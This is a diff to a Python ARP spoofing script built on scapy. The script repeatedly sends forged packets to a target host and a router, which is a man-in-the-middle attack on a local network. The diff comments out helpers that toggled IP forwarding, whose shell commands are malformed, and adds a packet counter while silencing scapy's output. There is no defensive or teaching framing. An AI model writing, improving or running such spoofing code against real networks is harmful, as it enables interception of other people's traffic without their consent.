@@ -58,13 +58,13 @@ def spoof(dest_IP, spoofed_IP):
 
 
 # def start_flow(i):
-    print("[+] Stated port forwarding")
-    subprocess.run("echo '1' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
+#    print("[+] Stated port forwarding")
+#    subprocess.run("echo '1' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
 # def stop_flow(i):
-    print("[+] ending port forwarding")
-    subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
+#    print("[+] ending port forwarding")
+#    subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
 def main():
@@ -79,9 +79,12 @@ def main():
 #    start_flow(interface)
 
     print("[+] Spoofing has begin")
+    packet_count = 0
     while True:
-        scapy.send(packet_for_target)
-        scapy.send(packet_for_router)
+        scapy.send(packet_for_target, verbose=False)
+        scapy.send(packet_for_router, verbose=False)
+        packet_count = packet_count + 2
+        print("[+] sent " + str(packet_count) + " packets")
         time.sleep(3)
 
 #    atexit.register(stop_flow(interface))
